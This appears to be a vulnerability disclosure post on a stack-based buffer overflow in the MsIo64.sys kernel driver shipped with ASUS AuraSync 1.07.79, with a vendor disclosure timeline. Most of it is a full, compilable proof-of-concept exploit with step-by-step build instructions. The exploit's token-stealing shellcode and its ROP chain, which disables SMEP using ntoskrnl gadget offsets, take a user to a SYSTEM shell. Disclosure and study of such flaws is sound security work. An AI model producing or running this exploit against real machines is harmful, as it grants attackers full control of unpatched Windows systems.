---
title : "ASUS AuraSync Kernel Stack Based Buffer Overflow Local Privilege Escalation"
excerpt: "ASUS AuraSync Kernel Stack Based Buffer Overflow Local Privilege Escalation"

categories:
    - "0-day"
tags:
    - [Mitre, ASUS]
---

## 0x01: Details

- Title : ASUS AuraSync Kernel Stack Based Buffer Overflow Local Privilege Escalation
- CVE ID :
- Advisory Published: 2022/08/10
- Advisory URL : [https://www.asus.com/content/ASUS-Product-Security-Advisory/](https://www.asus.com/content/ASUS-Product-Security-Advisory/)
- Vender URL : [https://www.asus.com/](https://www.asus.com/)

## 0x02: Test Environment

OS : windows 10 pro 64-bit 21H2 (build 19044.1826)

ASUS AuraSync : 1.07.79_V2.2

## 0x03: Vulerability details

The kernel driver MsIo64.sys is included in Asus AuraSync 1.07.79. A stack-based buffer overflow exists in this kernel driver IOCTL dispatch function.

## 0x04: Techincal description

When you download ASUS AURA SYNC software, MsIo64.sys driver is installed together. In the IOCTL code of this driver, the memmove function is called at 0x80102040, but there is no path check at this time, so a stack based buffer overflow vulnerability may occur.

```c
__int64 __fastcall sub_113F0(__int64 a1, IRP *a2) {
	ULONG_PTR Src[2]; // [rsp+30h] [rbp-48h]
	...
	switch ( LowPart )
	{
		case 0x80102040:
		  DbgPrint("IOCTL_MSIO_MAPPHYSTOLIN");
		  if ( !(_DWORD)Options )
		    goto LABEL_9;
		  memmove(Src, MasterIrp, Options);
		  v11 = sub_FFFFF80375F91090((PHYSICAL_ADDRESS)Src[1], Src[0], &BaseAddress, &Handle, &Object);
		  if ( v11 >= 0 )
		  {
		    memmove(MasterIrp, Src, Options);
		    a2->IoStatus.Information = Options;
		  }
		  a2->IoStatus.Status = v11;
		  break;
	...
}
```

MasterIrp is lpInBuffer as an argument when calling the DeviceIoControl function. Since lpInBuffer is moved to Src, and the length is not checked, a rop attack is possible by changing the dispatch function return address.

## 0x05: Proof-of-Concept (PoC)

```c
#include <stdio.h>
#include <string>
#include <Windows.h>
#include <Psapi.h>
#define IOCTL_CODE 0x80102040

BYTE shellcode_[] =
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, gs:[188h]       ; _ETHREAD
"\x4C\x8B\x82\x20\x02\x00\x00"              // mov r8, [rdx + 220h]     ; _EPROCESS
"\x4D\x8B\x88\x48\x04\x00\x00"              // mov r9, [r8 + 448h]      ; ActiveProcessLinks
"\x49\x8B\x09"                              // mov rcx, [r9]            

// GetProcessByPid
"\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; UniqueProcessId
"\x48\x83\xFA\x04"                          // cmp rdx, 4               ; PID 4 SYSTEM process
"\x74\x05"                                  // jz found_system          ; SYSTEM token
"\x48\x8B\x09"                              // mov rcx, [rcx]           ; _LIST_ENTRY Flink
"\xEB\xF1"                                  // jmp find_system_proc     ; While
// FoundGetProcess

"\x48\x8B\x41\x70"                          // mov rax, [rcx + 70h]     ; Get Token
"\x24\xF0"                                  // and al, 0f0h             
// FindProcess

"\x48\x8B\x51\xF8"                          // mov rdx, [rcx-8]         ; UniqueProcessId
"\x48\x81\xFA\x00\x00\x00\x00"              // cmp rdx, 0d54h           ; if UniqueProcessId == CurrentPid
"\x74\x05"                                  // jz found_cmd             ; True - jump FoundProcess
"\x48\x8B\x09"                              // mov rcx, [rcx]           ; False - next entry
"\xEB\xEE"                                  // jmp find_cmd             ; jump FindProcess
// FoundProcess

"\x48\x89\x41\x70"                          // mov [rcx+70h], rax       ; Overwrite SYSTEM token
"\x48\x31\xc0"                              // xor rax rax 
"\x48\x31\xc9"                              // xor rcx rcx              
"\x48\x31\xf6"                              // xor rsi,rsi
"\x48\x31\xff"                              // xor rdi, rdi
"\x4D\x31\xC0"                              // xor r8, r8
"\x48\xc7\xc1\xf8\x06\x35\x00"              // mov rcx, 0x3506f8        ; original cr4
"\xc3";                                     // ret

LPVOID GetBaseAddr(const char* drvname) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strcmp(szDrivers, drvname) == 0) {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

void exploit() {
    DWORD pid = GetCurrentProcessId();
    INT64 ntoskrnl = (INT64)GetBaseAddr("ntoskrnl.exe");
    HANDLE hDevice;

    hDevice = CreateFileA("\\\\.\\MsIo", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Error device open %d\n", GetLastError());
        exit(1);
    }
    printf("[+] Success device open\n");

    // Allocate executable memory
    BYTE* shellcode = (BYTE*)VirtualAlloc(NULL, sizeof(shellcode_), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode, shellcode_, sizeof(shellcode_));
    memcpy(shellcode + 54, &pid, sizeof(pid));              // Change the pid of the shellcode

    INT64 disable_SMEP = 0x250ef8;                          // cr4 value, disable SMEP
    INT64 enable_SMEP = 0x350ef8;                           // cr4 value, enable SMEP
    INT64 pop_rcx = ntoskrnl + 0x314f03;                    // pop rcx; ret
    INT64 mov_cr4 = ntoskrnl + 0x9a4217;                    // mov cr4, rcx; ret
    INT64 wbinvd = ntoskrnl + 0x37fb50;                     // wbinvd; ret
    INT64 ret = pop_rcx + 1;                                // ret

    printf("[+] SMEP disabled\n");

    BYTE input[136] = { 0, };
    memset(input, 0x90, 72);                        // dummy
    memcpy(input + 72, &pop_rcx, 8);                // pop rcx
    memcpy(input + 80, &disable_SMEP, 8);           // disable SMEP value
    memcpy(input + 88, &mov_cr4, 8);                // mov cr4, rcx
    memcpy(input + 96, &wbinvd, 8);                 // wbinvd; ret
    memcpy(input + 104, &shellcode, 8);             // shellcode
    memcpy(input + 112, &mov_cr4, 8);               // mov cr4, rcx 
    memcpy(input + 120, &ret, 8);                   // restore rsp(stack)
    memcpy(input + 128, &ret, 8);                   // restore rsp(stack)

    DWORD temp;
    if (!DeviceIoControl(hDevice, IOCTL_CODE, input, sizeof(input), NULL, 0, &temp, NULL)) {
        printf("[-] Failed DeviceIoControl %d\n", GetLastError());
        exit(1);
    }

    printf("[+] SMEP enabled\n");
    printf("[+] Sucesss execute shellcode\n");
    printf("[+] Success Get SYSTEM shell\n");
    printf("\n\n");
    system("cmd");
}

int main() {
    exploit();
    return 0;
}
```

1. Use Visual Studio 2019
2. Compile with x64 release mode
3. Execute the compiled file

## 0x06: Affected Products

This vulnerability affects the following product:

- ASUS AuraSync ≤ 1.07.79_V2.2

## 0x07: Credit information

HeeChan Kim (@heegong123) of TeamH4C

## 0x08: TimeLine

- 2022/07/28 : First contact via E-Mail ([security@asus.com](mailto:security@asus.com)) to negotiate a security channel;
- 2022/08/01 : I received a call from Asus Security to analyze the vulnerability.
- 2022/08/09 : I was provided with a patched version of the vulnerability.
- 2022/09/18 : My name is inducted into the Asus Hall of Fame.
- 2022/10/11 : The latest version update notice has been posted in the ASUS Latest security updates.

## 0x09: Reference

- [https://www.asus.com/campaign/aura/us/download.php](https://www.asus.com/campaign/aura/us/download.php)
- [https://www.asus.com/content/ASUS-Product-Security-Advisory/](https://www.asus.com/content/ASUS-Product-Security-Advisory/)